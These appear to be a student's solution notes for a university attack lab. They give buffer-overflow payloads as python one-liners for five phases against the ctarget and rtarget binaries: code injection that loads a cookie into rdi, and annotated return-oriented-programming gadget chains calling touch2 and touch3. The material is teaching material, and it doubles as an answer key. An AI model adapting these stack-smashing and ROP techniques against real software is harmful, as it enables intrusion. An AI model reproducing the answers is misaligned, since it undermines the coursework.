# Solutions

cookie: 0x59b997fa

## info

piping into gdb example: ./hex2raw < phase2.txt > rawphase2.txt

## phase 1

python3 -c 'import sys; sys.stdout.buffer.write(b"a"*40 + b"\xc0\x17\x40")' | ./ctarget -q

## phase 2

gcc -c gen_byte_code.s
objdump -d gen_byte_code.o  > gen_byte_code.d

info: move cookie to rdi, push address of touch2 onto stack (this updates the stack pointer also), call retq (which pops return address from stack which points to touch2.

python3 -c 'import sys; sys.stdout.buffer.write( b"\xbf\xfa\x97\xb9\x59" + b"\x68\xec\x17\x40\x00" + b"\xc3" + b"\x00"*29 + b"\x78\xdc\x61\x55" + b"\x00"*4)' | ./ctarget -q

## phase 3

cookie:

0x35 0x39 0x62 0x39 0x39 0x37 0x66 0x61

continue at address 0x5561dc78 (first address of buffer);
move memory address of first character of string into rdi (address is 0x5561dc78 + 49... remember: 40-48 is reserved for return address that points at exploit code);
push func address of touch3 onto stack;
return (this takes you to touch3);

python3 -c 'import sys; sys.stdout.buffer.write( b"\x48\xc7\xc7\xa8\xdc\x61\x55" + b"\x68\xfa\x18\x40\x00" + b"\xc3" + b"\x00"*27 + b"\x78\xdc\x61\x55" + b"\x00"*4 + b"\x35\x39\x62\x39\x39\x37\x66\x61\x00")' | ./ctarget -q

## phase 4

Probable approach: use our interesting code bits in our gadgets to pass cookie to rdi, then hit touch 2... we want to structure our buffer so that it contains addresses of interesting function bits in sequential order.

^ this approach was right!

python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*40 + b"\xcc\x19\x40"+ b"\x00"*5 + b"\xfa\x97\xb9\x59" + b"\x00"*4 + b"\xa2\x19\x40" + b"\x00"*5 + b"\xec\x17\x40"+b"\x00"*5)' | ./rtarget -q

## phase 5

Probable approach: move pass cookie address to rdi, then hit touch 3. We'll have to calculate an offset for the cookie address. In more formal terms: move rsp to another register, pop offset (for where string will be stored) from stack and save value in another register, add the two registers together -> put the output into rdi -> call touch 3

^ this approach was right!

comments:

```text
python3 -c 'import sys; sys.stdout.buffer.write(
    b"\x90"*40 + # buffer padding
    b"\x06\x1a\x40"+b"\x00"*5 + # rsp -> rax (stack pointer in rax)
    b"\xc5\x19\x40"+b"\x00"*5 + # rax -> rdi (this move needs to happen since the only 'popq' widget that's available to use writes to rax. stack pointer in rdi)
    b"\xab\x19\x40"+b"\x00"*5 + # popq -> rax (eventual offset to stack pointer in rax)
    b"\x48"+b"\x00"*7 + # value that will be popped from stack and placed in rax
    b"\x42\x1a\x40"+b"\x00"*5 + # move offset value from eax to edx (a useless testb is performed)
    b"\x34\x1a\x40"+b"\x00"*5 + # move offset value from edx to ecx ( a useless cmpb is performed)
    b"\x13\x1a\x40"+b"\x00"*5 + # move offset value from ecx to esi (finally we can take advantage of the lea instruction that's present in one of the widgets)
    b"\xd6\x19\x40"+b"\x00"*5 + # lea (%rdi,%rsi,1),%rax (so effectively take stack pointer in rdi and add offset of 0x48 to it in rsi and store output in rax)
    b"\xc5\x19\x40"+b"\x00"*5 + # again, move rax to rdi. rdi will now contain starting address of our string
    b"\xfa\x18\x40"+b"\x00"*5 + # touch3 address
    b"\x35\x39\x62\x39\x39\x37\x66\x61\x00")' | ./rtarget -q # cooke with null terminator
```

no comments:

```text
python3 -c 'import sys; sys.stdout.buffer.write(
    b"\x90"*40 +
    b"\x06\x1a\x40"+b"\x00"*5 + 
    b"\xc5\x19\x40"+b"\x00"*5 + 
    b"\xab\x19\x40"+b"\x00"*5 +
    b"\x48"+b"\x00"*7 + 
    b"\x42\x1a\x40"+b"\x00"*5 + 
    b"\x34\x1a\x40"+b"\x00"*5 + 
    b"\x13\x1a\x40"+b"\x00"*5 + 
    b"\xd6\x19\x40"+b"\x00"*5 + 
    b"\xc5\x19\x40"+b"\x00"*5 + 
    b"\xfa\x18\x40"+b"\x00"*5 + 
    b"\x35\x39\x62\x39\x39\x37\x66\x61\x00")' | ./rtarget -q
```
